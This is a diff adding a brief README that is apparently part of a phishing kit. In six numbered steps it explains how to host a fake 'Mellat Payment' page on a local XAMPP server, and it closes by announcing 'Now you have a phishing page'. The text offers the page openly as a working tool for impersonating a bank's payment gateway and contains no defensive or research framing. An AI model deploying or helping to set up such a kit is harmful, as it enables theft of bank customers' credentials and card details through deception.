@@ -1,0 +1,14 @@
+1- download xampp ( in drive C )
+
+2- open xampp and start Apache 
+
+3- edit code's ( Read the edit.txt )
+
+4- now Cut the project file // And paste this path (C:\xampp\htdocs)
+
+5- open Browser and search  ( localhost/Mellat Payment )
+
+6- Now you have a phishing page👁️
+
+//lxxcloud
+
